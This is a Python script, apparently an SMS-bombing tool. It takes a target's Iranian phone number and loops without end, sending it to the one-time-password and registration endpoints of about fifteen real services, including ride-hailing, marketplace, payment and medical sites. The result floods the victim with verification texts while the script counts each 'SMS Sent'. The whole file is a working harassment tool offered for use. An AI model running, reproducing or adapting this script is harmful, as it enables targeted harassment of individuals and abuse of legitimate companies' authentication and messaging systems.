from colorama import Fore as F
from requests import get,post
import sys
import os
import time
#from helplist import banner
#//////////////////////////

class sms:
  def __init__(self):
    self.number = int(input(F.RED+" [•] "+F.CYAN+"Enter the target phone number as follows"+F.RED+" (937XXXXXXX)"+F.LIGHTBLUE_EX+" : "+F.LIGHTGREEN_EX+">> "+F.LIGHTCYAN_EX))
    
    self.sended = 0
    
    
  def check(self):
    
    if not len(str(self.number)) == 10:
      print(F.RED+"\n [-] "+F.WHITE+"ERROR\n"+F.LIGHTGREEN_EX+"      Please enter the phone number "+F.RED+"without"+F.WHITE+" ["+F.LIGHTRED_EX+" 0, +, 98  "+F.WHITE+"] "+F.LIGHTGREEN_EX+":)))")
      sys.exit()
      
    self.run()
    
  
    
  def snapp(self):
    
    snappd= {"cellphone":f"98{self.number}"}
    
    snappr = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",snappd).text
    if 'OK' in snappr:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}"+F.LIGHTRED_EX+" ]",end='\r')
    
  def shad(self):
    
    shadd = {"api_version":3,"method":"sendCode","data":{"send_type":"SMS","phone_number":f"98{self.number}"}}
    
    
    shadr = post("https://shadmessenger55.iranlms.ir/",json=shadd).text
    if 'OK' in shadr:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}",end='\r')
    
  def torob(self):
    
    torobd ={"api_version":"3","method":"sendCode","data":{"phone_number":f"98{self.number}","send_type":"SMS"}}
    
    torobr = get(f"https://api.torob.com/a/phone/send-pin/?phone_number=0{self.number}",json=torobd).text
    if 'pin code sent' in torobr:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}",end='\r')
    
  def digipi(self):
    
    digipid = {"cellNumber":f"0{self.number}","device":{"deviceId":"c0b1498a-4ad7-41e9-b05a-96e6b4482341","deviceModel":"WEB_BROWSER","deviceAPI":"WEB_BROWSER","osName":"WEB"}}
    
    digipir = post("https://app.mydigipay.com/digipay/api/users/send-sms",json=digipid).text
    if "عملیات با موفقیت انجام شد" in digipir:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}",end='\r')
    
  def tapsi(self):
    
    tapsid = {"credential":{"phoneNumber":f"0{self.number}","role":"PASSENGER"}}
    tapsir = post("https://api.tapsi.cab/api/v2/user",json=tapsid).text
    if 'OK' in tapsir:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}",end='\r')
    
  def bama(self):
    
    bamad = {"cellNumber":f"0{self.number}"}
    bamar = post("https://bama.ir/signin-send-otp",bamad).text
    if '200' in bamar:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}",end='\r')
    
  def alibaba(self):
    
    alibabad = {"phoneNumber":f"0{self.number}"}
    alibabar = post("https://ws.alibaba.ir/api/v3/account/mobile/otp",json=alibabad).text 
    if 'پیامک حاوی کد یکبار مصرف برای شما ارسال شده است.' in alibabar:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}",end='\r')
    
  def gap(self):
    
    gapr = get("https://core.gap.im/v1/user/add.json?mobile=%2B"+f"98{self.number}").text
    if 'OK' in gapr:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}",end='\r')
    
  def namava(self):
    
    namavad = {"UserName":f"+98{self.number}"}
    namavar = post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",json=namavad).text
    if 'true' in namavar:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}",end='\r')
  
  def divar(self):
    
    divard = {"phone":f"0{self.number}"}
    divarr = post("https://api.divar.ir/v5/auth/authenticate",json=divard).text
    if 'AUTHENTICATION_VERIFICATION_CODE_SENT' in divarr:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}",end='\r')
  def a4baz(self):
    
    a4bazd = {"cellphone":f"0{self.number}"}
    a4bazr = post("https://a4baz.com/api/web/login",json=a4bazd).text
    if 'true' in a4bazr:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}",end='\r')
  
  def doc(self):
    
    docd = {"mobile":f"0{self.number}"}
    docr = post("https://doctoreto.com/web/api/v2/auth/code",docd).text
    if '\u0644\u0637\u0641\u0627 \u0628\u0631\u0627\u06cc \u062f\u0631\u06cc\u0627\u0641\u062a \u06a9\u062f \u062a\u0627\u06cc\u06cc\u062f \u0645\u062c\u062f\u062f\u060c \u06a9\u0645\u06cc \u0635\u0628\u0631 \u06a9\u0646\u06cc\u062f.' in docr:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}",end='\r')
  def drdr(self):
    
    drdrd = {"phoneNumber":str(self.number),"userType":"PATIENT"}
    drdrr = post("https://drdr.ir/api/registerEnrollment/verifyMobile",json=drdrd).text
    if "Account created successfully" in drdrr:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}",end='\r')
  def filmnet(self):
    filmnetr = get(f"https://api-v2.filmnet.ir/access-token/users/0{self.number}/otp").text
    if 'موفق' in filmnetr:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}",end='\r')
      
      
  def achare(self):
    achared ={"phone":f"98{self.number}","utm_source":"null"}
    acharer = post("https://api.achareh.ir/v2/accounts/login/",achared).text
    if 'true' in acharer:
      self.sended += 1
      print(F.LIGHTRED_EX+" [ "+F.LIGHTCYAN_EX+"SMS Sent"+F.LIGHTBLUE_EX+" : >>"+F.LIGHTGREEN_EX+f" {self.sended}",end='\r')
      
  def run(self):
    
    while True:
      
      self.snapp()
      self.shad()
      self.torob()
      self.digipi()
      self.tapsi()
      self.bama()
      self.alibaba()
      self.gap()
      self.namava()
      self.divar()
      self.a4baz()
      self.doc()
      self.drdr()
      self.filmnet()
      self.achare()
      time.sleep(0.1)



#sms().achare()
if __name__ == '__main__':
  try:
    #pass
    sms().check()
  except:
    try:
      #pass
      input(F.LIGHTRED_EX+"\n [!] "+F.LIGHTCYAN_EX+"Back To Menu (Press Enter) ... ")
    except:
      print("")
      sys.exit()


# Coded By SirVariable
